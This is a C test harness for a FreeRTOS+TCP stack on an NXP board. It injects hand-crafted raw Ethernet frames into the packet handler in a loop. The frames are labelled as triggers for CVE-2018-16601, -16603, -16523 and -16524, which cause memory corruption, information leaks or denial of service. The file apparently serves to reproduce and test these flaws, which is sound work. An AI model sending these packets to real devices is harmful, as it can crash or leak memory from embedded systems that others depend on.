/*
* The Clear BSD License
* Copyright (c) 2016, Freescale Semiconductor, Inc.
 * Copyright 2016-2017 NXP
* All rights reserved.
*
* 
* Redistribution and use in source and binary forms, with or without modification,
* are permitted (subject to the limitations in the disclaimer below) provided
*  that the following conditions are met:
*
* o Redistributions of source code must retain the above copyright notice, this list
*   of conditions and the following disclaimer.
*
* o Redistributions in binary form must reproduce the above copyright notice, this
*   list of conditions and the following disclaimer in the documentation and/or
*   other materials provided with the distribution.
*
* o Neither the name of the copyright holder nor the names of its
*   contributors may be used to endorse or promote products derived from this
*   software without specific prior written permission.
*
* NO EXPRESS OR IMPLIED LICENSES TO ANY PARTY'S PATENT RIGHTS ARE GRANTED BY THIS LICENSE.
* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
* ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
* WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
* DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
* ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
* (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
* LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
* ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
* (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
* SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

/*******************************************************************************
 * Includes
 ******************************************************************************/

#include "lwip/opt.h"

#if LWIP_SOCKET
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <ctype.h>

#include "lwip/memp.h"
#include "lwip/netif.h"
#include "lwip/sys.h"
#include "lwip/arch.h"
#include "lwip/api.h"
#include "lwip/tcpip.h"
#include "lwip/ip.h"
#include "lwip/sockets.h"
#include "netif/etharp.h"

#include "FreeRTOS_IP.h"
#include "FreeRTOS_Sockets.h"
#include "FreeRTOS_IP_Private.h"

#include "ethernetif.h"
#include "board.h"

#include "httpsrv.h"

#include "fsl_device_registers.h"
#include "pin_mux.h"
#include "clock_config.h"
/*******************************************************************************
 * Definitions
 ******************************************************************************/

/* IP address configuration. */
#define configIP_ADDR0 192
#define configIP_ADDR1 168
#define configIP_ADDR2 0
#define configIP_ADDR3 102

/* Netmask configuration. */
#define configNET_MASK0 255
#define configNET_MASK1 255
#define configNET_MASK2 255
#define configNET_MASK3 0

/* Gateway address configuration. */
#define configGW_ADDR0 192
#define configGW_ADDR1 168
#define configGW_ADDR2 0
#define configGW_ADDR3 100

/* MAC address configuration. */
const uint8_t ucMACAddress[ 6 ] =  {0x02, 0x12, 0x13, 0x10, 0x15, 0x11};


/*******************************************************************************
* Prototypes
******************************************************************************/



/*******************************************************************************
* Variables
******************************************************************************/

static const uint8_t ucIPAddress[ 4 ] = { configIP_ADDR0, configIP_ADDR1, configIP_ADDR2, configIP_ADDR3 };
static const uint8_t ucNetMask[ 4 ] = { configNET_MASK0, configNET_MASK1, configNET_MASK2, configNET_MASK3 };
static const uint8_t ucGatewayAddress[ 4 ] = { configGW_ADDR0, configGW_ADDR1, configGW_ADDR2, configGW_ADDR3 };
static const uint8_t ucDNSServerAddress[ 4 ] = { 192, 168, 0, 100 };



/*******************************************************************************
 * Code
 ******************************************************************************/

void vApplicationIPNetworkEventHook( eIPCallbackEvent_t eNetworkEvent )
{}

BaseType_t xApplicationDNSQueryHook( const char *pcName )
{
	return 0;
}

const char *pcApplicationHostnameHook( void )
{
	return "123";
}

static void netTask(NetworkBufferDescriptor_t *pxBuffer, uint8_t *b, uint32_t len) {
	pxBuffer->pucEthernetBuffer = b;
	pxBuffer->xDataLength = len;

	prvHandleEthernetPacket( pxBuffer );
}

uint8_t databuffer[1056] = {0};
uint32_t dataLength = 12;


int main(void)
{
    SYSMPU_Type *base = SYSMPU;
    BOARD_InitPins();
    BOARD_BootClockRUN();
    BOARD_InitDebugConsole();
    /* Disable SYSMPU. */
    base->CESR &= ~SYSMPU_CESR_VLD_MASK;
    /* Set RMII clock src. */
    SIM->SOPT2 |= SIM_SOPT2_RMIISRC_MASK;

    PRINTF(" in main \n");


    FreeRTOS_IPInit( ucIPAddress, ucNetMask, ucGatewayAddress, ucDNSServerAddress, ucMACAddress );

    PRINTF(" after IP init \n");

    Socket_t xSocket = FreeRTOS_socket( FREERTOS_AF_INET, FREERTOS_SOCK_STREAM, FREERTOS_IPPROTO_TCP );
    struct freertos_sockaddr xAddress;
    xAddress.sin_port = FreeRTOS_htons( 80 );
    xAddress.sin_addr = 0u;	/* For the moment. */
    FreeRTOS_Socket_t * pxSocket = ( FreeRTOS_Socket_t * ) xSocket;
	pxSocket->usLocalPort = 0u;
	vSocketBind( pxSocket, &xAddress, sizeof( xAddress ), pdFALSE );
	FreeRTOS_listen( xSocket, 12 );

	PRINTF(" after TCP init \n");


    NetworkBufferDescriptor_t *netbuffer;
    netbuffer = (NetworkBufferDescriptor_t *)pvPortMalloc(sizeof(NetworkBufferDescriptor_t));
    memset(netbuffer, 0, sizeof(NetworkBufferDescriptor_t));



    //typedef struct xNETWORK_BUFFER
    //{
//    	ListItem_t xBufferListItem; 	/* Used to reference the buffer form the free buffer list or a socket. */
    //	uint32_t ulIPAddress;			/* Source or destination IP address, depending on usage scenario. */
    //	uint8_t *pucEthernetBuffer; 	/* Pointer to the start of the Ethernet frame. */
    //	size_t xDataLength; 			/* Starts by holding the total Ethernet frame length, then the UDP/TCP payload length. */
    //	uint16_t usPort;				/* Source or destination port, depending on usage scenario. */
    //	uint16_t usBoundPort;			/* The port to which a transmitting socket is bound. */
    //	#if( ipconfigUSE_LINKED_RX_MESSAGES != 0 )
    //		struct xNETWORK_BUFFER *pxNextBuffer; /* Possible optimisation for expert users - requires network driver support. */
    //	#endif
    //} NetworkBufferDescriptor_t;



    netbuffer->ulIPAddress = 0;
//    netbuffer->pucEthernetBuffer = databuffer;
//    netbuffer->xDataLength = dataLength;
    netbuffer->usPort = 0;
    netbuffer->usBoundPort = 0;



    // CVE-2018-16601 – IP DoS\Memory corruption
//    char * packet = "\x00\x00\x5e\x00\x01\x24\xac\xd1\xb8\xd1\x9b\x63\x08\x00\x4f\x00" // \x4f
//    		        "\x00\x34\x09\xf6\x00\x00\x40\x06\x14\xf5\x42\x47\x29\x95\xc0\xa8"
//    		        "\x00\x66\x9a\xa0\x01\xbb\x33\x0f\x32\xbb\xa6\xcd\x4e\xc0\x80\x10"
//    		        "\x05\xce\x78\x7a\x00\x00\x01\x01\x08\x0a\xb7\x75\x25\x74\x00\x00"
//    		        "\x07\xf5";

    // CVE-2018-16603 -TCP information leak
//    char * packet = "\x00\x00\x5e\x00\x01\x24\xac\xd1\xb8\xd1\x9b\x63\x08\x00\x45\x00"
//    		        "\x00\x34\x09\xf6\x00\x00\x40\x06\x14\xf5\x42\x47\x29\x95\xc0\xa8"
//    		        "\x00\x66"; // with tcp mark and no tcp header

    // CVE-2018-16523 - TCP Options information leak\DoS
//	char * packet = "\x00\x00\x5e\x00\x01\x24\xac\xd1\xb8\xd1\x9b\x63\x08\x00\x45\x00"
//					"\x00\x34\x09\xf6\x00\x00\x40\x06\x14\xf5\x42\x47\x29\x95\xc0\xa8"
//					"\x00\x66\x9a\xa0\x00\x50\x33\x0f\x32\xbb\xa6\xcd\x4e\xc0\xf0\x02" // \xf0
//					"\x05\xce\x78\x7a\x00\x00\x01\x01\x08\x0a\xb7\x75\x25\x74\x00\x00"
//					"\x07\xf5";


	// CVE-2018-16524 - TCP Options information leak\DoS
	char * packet = "\x00\x00\x5e\x00\x01\x24\xac\xd1\xb8\xd1\x9b\x63\x08\x00\x45\x00"
					"\x00\x34\x09\xf6\x00\x00\x40\x06\x14\xf5\x42\x47\x29\x95\xc0\xa8"
					"\x00\x66\x9a\xa0\x00\x50\x33\x0f\x32\xbb\xa6\xcd\x4e\xc0\x80\x02"
					"\x05\xce\x78\x7a\x00\x00\x02\x04\x00\x00\x00\x00\x25\x74\x00\x00" // \x02\x04\x00\x00\x00\x00
					"\x07\xf5";

    PRINTF(" enter into netTask loop \n");

    for (;;)
    {
    	memcpy(databuffer, packet, 66);
    	dataLength = 66;
    	*ipLOCAL_IP_ADDRESS_POINTER = FreeRTOS_inet_addr_quick( ucIPAddress[ 0 ], ucIPAddress[ 1 ], ucIPAddress[ 2 ], ucIPAddress[ 3 ] );
    	netTask(netbuffer, databuffer, dataLength);
    	PRINTF("-cc-> another loop \n");
    }

    vPortFree(netbuffer);






    /* run RTOS */
//    vTaskStartScheduler();

    /* should not reach this statement */
    for (;;)
        ;
}

#endif // LWIP_SOCKET
